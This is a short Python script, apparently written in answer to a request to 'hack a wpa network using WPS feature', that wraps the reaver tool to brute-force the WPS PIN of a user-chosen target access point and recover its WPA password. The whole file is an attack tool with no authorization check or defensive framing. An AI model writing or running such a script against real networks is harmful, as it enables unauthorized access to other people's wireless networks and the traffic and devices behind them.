# Write a python script to hack a wpa network using WPS feature

import subprocess
import re

def get_interface_mac(interface):
    ifconfig_output = subprocess.check_output(["ifconfig", interface]).decode()
    match = re.search(r'unspec\s+([A-Fa-f0-9\-]+)', ifconfig_output)
    if match:
        mac = match.group(1).replace('-', ':')
        return mac[:17]
    else:
        return None

def run_reaver(interface, target_mac, channel):
    print(f"[+] Starting reaver on {interface}, targeting {target_mac} (channel {channel})")
    print("[+] Reaver started. Monitor the output for WPS PIN and password.")
    proc = subprocess.Popen([
        "reaver",
        "--bssid", target_mac,
        "--channel", channel,
        "--interface", interface,
        "-vvv",
        "--no-associate"
    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    try:
        for line in proc.stdout:
            print(line, end='')  # Print all reaver logs in real time
    finally:
        proc.terminate()
        proc.wait()

def wpa_wps_hack(interface, target_mac):
    print(f"[+] Starting WPA WPS hack on {target_mac} using {interface}")
    mac = get_interface_mac(interface)
    if not mac:
        print(f"[-] Could not retrieve MAC address for interface {interface}.")
        return

    print(f"[i] Interface MAC: {mac}")
    channel = input("Enter the Wi-Fi channel to monitor (e.g., 1, 6, 11): ").strip()

    # Bring interface down, set channel, bring up (for reliability)
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["iwconfig", interface, "channel", channel])
    subprocess.call(["ifconfig", interface, "up"])

    # Start reaver (in the foreground for simplicity)
    run_reaver(interface, target_mac, channel)

if __name__ == "__main__":
    interface = input("Enter the wireless interface name (e.g., wlan0): ").strip()
    target_mac = input("Enter the target Wi-Fi MAC address: ").strip()

    wpa_wps_hack(interface, target_mac)